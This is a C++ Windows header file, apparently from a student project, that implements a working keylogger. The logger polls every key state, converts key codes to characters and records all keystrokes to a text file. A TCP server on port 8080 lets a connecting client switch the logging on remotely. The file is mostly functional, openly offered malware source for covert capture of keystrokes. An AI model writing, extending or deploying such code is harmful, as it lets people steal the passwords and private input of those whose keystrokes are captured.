#pragma once
#ifndef HEADER_H
#define HEADER_H

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN //resolve conflict between windows.h and winsock2.h
#endif
#define DEFAULT_PORT "8080"

#include <iostream>
#include <string>
#include <fstream>
#include <vector>
#include <thread> 
#include <chrono>
#include <winsock2.h>
#include <ws2tcpip.h> //for IP Helper API
#include <iphlpapi.h> //for IP Helper API

#pragma comment(lib, "Ws2_32.lib") //Winsock Library
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")

using namespace std;

// Ham de chuyen doi ma phim thanh chuoi ki tu
string translateKey(int key, bool capsLock, bool shiftPressed, bool winPressed) {
	if (key == VK_SPACE) return "[SPACE]";
	if (key == VK_RETURN) return "[ENTER]";
	if (key == VK_BACK) return "[BACKSPACE]";
	if (key == VK_SHIFT) return "[SHIFT]";
	if (key == VK_CONTROL) return "[CTRL]";
	if (key == VK_TAB) return "[TAB]";
	if (key == VK_ESCAPE) return "[ESC]";
	if (key == VK_LWIN || key == VK_RWIN) return winPressed ? "[WIN]" : "";//Xu ly phim Window

	//Xu li phim so va cac k tu dac biet
	if (key >= '0' && key <= '9') {
		if (shiftPressed) {
			std::string shiftSymbols = ")!@#$%^&*(";  //Shift tuong ung voi cac so
			return string(1, shiftSymbols[key - '0']);
		}
		return string(1, (char)key);  //So binh thuong
	}

	//Xu ly cac phim chu cai
	if (key >= 'A' && key <= 'Z') {
		if (capsLock ^ shiftPressed) {
			return string(1, (char)key);  // Chu Hoa
		}
		return string(1, (char)(key + 32));  // Chu Thuong
	}

	//Xu li cac phim khong chu cai
	switch (key) {
	case VK_OEM_1: return shiftPressed ? ":" : ";";
	case VK_OEM_2: return shiftPressed ? "?" : "/";
	case VK_OEM_3: return shiftPressed ? "~" : "`";
	case VK_OEM_4: return shiftPressed ? "{" : "[";
	case VK_OEM_5: return shiftPressed ? "|" : "\\";
	case VK_OEM_6: return shiftPressed ? "}" : "]";
	case VK_OEM_7: return shiftPressed ? "\"" : "'";
	case VK_OEM_PLUS: return shiftPressed ? "+" : "=";
	case VK_OEM_COMMA: return shiftPressed ? "<" : ",";
	case VK_OEM_MINUS: return shiftPressed ? "_" : "-";
	case VK_OEM_PERIOD: return shiftPressed ? ">" : ".";
	}

	return "";  // Khong xu li cac phim khac
}

// Hàm keylogger chính
void Keylogger(bool &isTurnOn) {
	fstream output;
	output.open("keylogger.txt", ios::out);
	bool capsLock = false;  // Trạng thái của Caps Lock
	bool winPressed = false;  // Trạng thái của phím Windows
	vector<int> previousStates(256, 0);  // Mảng lưu trạng thái của các phím trước đó

	while (true) {
		if (!isTurnOn) continue;
		Sleep(10);  // Giảm tải CPU

		// Kiểm tra trạng thái của CapsLock
		capsLock = (GetKeyState(VK_CAPITAL) & 0x0001);

		// Kiểm tra trạng thái của phím Windows
		winPressed = (GetAsyncKeyState(VK_LWIN) & 0x8000) || (GetAsyncKeyState(VK_RWIN) & 0x8000);

		for (int i = 8; i <= 0xFE; i++) {  // Kiểm tra tất cả các phím từ 0x08 đến 0xFE
			SHORT keyState = GetAsyncKeyState(i);  // Kiểm tra trạng thái phím

			if ((keyState & 0x8000) && !(previousStates[i] & 0x8000)) {  // Phím vừa được nhấn
				bool shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000);
				string keyData = translateKey(i, capsLock, shiftPressed, winPressed);
				if (!keyData.empty()) {
					output << "Key Pressed: " << keyData << endl;  // In ra màn hình
				}
			}

			// Cập nhật trạng thái của phím
			previousStates[i] = keyState;
		}
	}
	output.close();
}

struct ServerSocket {
	SOCKET listenSocket;
	SOCKET clientSocket;
	bool isTurnOnKeylogger = false;
	thread keyloggerThread;
	addrinfo* serverAddr = NULL;
	char buffer[512];
	void GetServerAddrInfo() {
		addrinfo hints;
		ZeroMemory(&hints, sizeof(hints));
		hints.ai_family = AF_INET;
		hints.ai_socktype = SOCK_STREAM;
		hints.ai_protocol = IPPROTO_TCP;
		hints.ai_flags = AI_PASSIVE;

		if (getaddrinfo(NULL, DEFAULT_PORT, &hints, &serverAddr) != 0) {
			cout << "getaddrinfo failed: %d\n";
			WSACleanup();
			exit(1);
		}
	}
	void SetSocketOption() {
		int opt = 1;
		if (setsockopt(listenSocket, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt)) == SOCKET_ERROR) {
			cout << "Set socket options failed! Error: " << WSAGetLastError() << endl;
			closesocket(listenSocket);
			WSACleanup();
		}
	}
	void BindSocket() {
		if (bind(listenSocket, serverAddr->ai_addr, (int)serverAddr->ai_addrlen)) {
			cout << "Bind failed: " << WSAGetLastError() << endl;
			closesocket(listenSocket);
			WSACleanup();
			exit(1);
		}
		freeaddrinfo(serverAddr); 
		serverAddr = NULL;
	}
	void Accept() {
		clientSocket = accept(listenSocket, NULL, NULL);
		if (clientSocket == INVALID_SOCKET) {
			cout << "Accept failed: " << WSAGetLastError() << endl;
			closesocket(listenSocket);
			WSACleanup();
		}
		cout << "Client connected!" << endl;
	}
	//May not properly for project ***
	void Shutdown() {
		// shutdown the connection
		if (shutdown(clientSocket, SD_SEND) == SOCKET_ERROR) {
			printf("shutdown failed with error: %d\n", WSAGetLastError());
			closesocket(clientSocket);
			WSACleanup();
		}
	}
	void Listen() {
		if (listen(listenSocket, SOMAXCONN) == SOCKET_ERROR) {
			cout << "Listen failed: " << WSAGetLastError() << endl;
			closesocket(listenSocket);
			WSACleanup();
		}
		cout << "Server is listening on port " << DEFAULT_PORT << endl;
		Accept();
	}
	void Send(const char* message) {
		if (send(clientSocket, message, (int)strlen(message), 0) == SOCKET_ERROR) {
			cout << "send failed: %d" << endl;
			WSAGetLastError();
			closesocket(clientSocket);
			WSACleanup();
		}
		cout << "Message: " << message << endl;
	}
	void ProcessClientMessage() {
		if (buffer[0] == '1') {
			isTurnOnKeylogger = true;
		}
	}
	void Receive() {
		int bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
		if (bytesReceived > 0) {
			buffer[bytesReceived] = '\0';
			cout << "Message from client: " << buffer << endl;
			ProcessClientMessage();
		}
		else if (bytesReceived == 0){
			cout << "Connection closed" << endl;
		}
		else {
			cout << "Receive failed: " << WSAGetLastError() << endl;
		}
	}
	void Close() {
		if (clientSocket != INVALID_SOCKET) {
			closesocket(clientSocket);
			clientSocket = INVALID_SOCKET;
		}
		if (listenSocket != INVALID_SOCKET) {
			closesocket(listenSocket);
			listenSocket = INVALID_SOCKET;
		}
	}
	ServerSocket() {
		isTurnOnKeylogger = false;
		keyloggerThread = thread(Keylogger, ref(isTurnOnKeylogger));
		/////////////////////////////////////////////////////////////////////
		GetServerAddrInfo();
		listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		SetSocketOption();
		if (listenSocket == INVALID_SOCKET) {
			cout << "Socket creation failed: " << WSAGetLastError() << endl;
			WSACleanup();
		}
		BindSocket();
		/////////////////////////////////////////////////////////////////////
	}
};
void InitWinsock(WSADATA& wsadata) {
	WSADATA wsaData;
	int iResult;
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		cout << "WSAStartup failed: %d\n";
		exit(1);
	}
}
void CloseWinsock() {
	WSACleanup();
}
#endif 